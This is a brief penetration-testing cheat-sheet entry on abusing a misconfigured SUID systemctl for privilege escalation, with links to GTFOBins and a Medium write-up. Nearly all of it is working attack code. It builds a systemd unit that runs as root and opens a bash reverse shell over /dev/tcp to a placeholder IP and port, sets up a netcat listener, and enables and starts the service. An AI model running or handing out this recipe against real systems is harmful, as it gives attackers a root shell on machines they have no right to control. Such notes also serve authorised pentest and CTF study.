# systemctl

{% embed url="https://gtfobins.github.io/gtfobins/systemctl#suid" %}

{% embed url="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" %}

```
$ cat <<EOF > root.service
>[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'

[Install]
WantedBy=multi-user.target
>EOF
```

```
Listen on <port>
$ nc -nlvp <port>
```

```
/bin/systemctl enable /dev/shm/root.service
/bin/systemctl start root
```
